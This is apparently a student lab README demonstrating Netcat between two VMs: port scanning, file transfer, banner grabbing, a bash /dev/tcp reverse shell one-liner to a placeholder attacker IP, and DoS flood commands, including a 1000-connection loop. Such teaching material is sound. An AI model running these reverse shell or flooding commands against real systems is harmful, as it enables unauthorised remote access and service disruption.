# Netcat Security Demonstration

## 📌 Introduction

Netcat (nc) is a powerful networking utility that can be used for testing, debugging, and security assessments. This repository documents key security-related features of Netcat, demonstrating both **offensive** and **defensive** security techniques.

---

## 🔹 Features Demonstrated

1️⃣ **Port Scanning** – Identifying open ports on a remote system\
2️⃣ **File Transfer** – Sending files over a network using Netcat\
3️⃣ **Reverse Shell** – Gaining remote shell access\
4️⃣ **Banner Grabbing** – Extracting service information\
5️⃣ **DoS Attack** – Flooding a service with junk data

---

## ⚡ 1. Port Scanning

Netcat can be used as a simple port scanner to identify open ports on a system.

📌 **On VM2 (Listener), open a port:**

```bash
nc -lvnp 4444
```

📌 **On VM1 (Attacker), scan for open ports:**

```bash
nc -zv <VM2 IP> 30-5000
```

📌 **Expected Output:**

```
Connection to <VM2 IP> 4444 port [tcp/ssh] succeeded!
```

---

## 📂 2. File Transfer

Netcat allows file transfer between two systems over a chosen port.

📌 **On VM2 (Listener), receive the file:**

```bash
nc -lvnp 4444 > received_file.txt
```

📌 **On VM1 (Sender), send the file:**

```bash
cat file.txt | nc <VM2 IP> 4444
```

📌 **Verification:**

```bash
cat received_file.txt  # Should match original file.txt
```

---

## 🛠️ 3. Reverse Shell (Remote Code Execution)

An attacker can use Netcat to execute remote commands by setting up a **reverse shell**.

📌 **On VM1 (Attacker), listen for a connection:**

```bash
nc -lvnp 4444
```

📌 **On VM2 (Victim), send a reverse shell:**

```bash
/bin/bash -i >& /dev/tcp/<VM1 IP>/4444 0>&1
```

✅ **Now, VM1 has remote shell access to VM2.**

---

## 🕵️ 4. Banner Grabbing

Attackers use banner grabbing to identify running services on a target.

📌 **On VM1, check which services are running on VM2:**

```bash
nc <VM2 IP> 22
```

📌 **Expected Output (if SSH is running):**

```
SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5
```

---

## 💥 5. DoS Attack (Flooding a Service)

Netcat can be used to simulate a simple **Denial of Service (DoS) attack** by flooding a service with data.

📌 **On VM2 (Listener), open a port:**

```bash
nc -lvnp 4444
```

📌 **On VM1 (Attacker), send a flood of data:**

```bash
yes "DATA ATTACK" | nc <VM2 IP> 4444
```

📌 **Alternatively, launch multiple connections:**

```bash
for i in {1..1000}; do nc <VM2 IP> 4444 & done
```

✅ **After some time, VM2 may slow down or crash.**

---

## 📂 Resources

All images related to the execution of the above Netcat demonstrations can be found in the **resources/** folder of this repository. Navigate to the respective subdirectories for screenshots of each feature.

---

## 🏫 Contributors

| Name               | Roll Number | Batch |
| ------------------ | ----------- | ----- |
| Aditya Kothari     | 16010122329 | C1    |
| Prashant Prajapati | 16010122322 | C1    |
| Nishar Kunj        | 16010123810 | C2    |


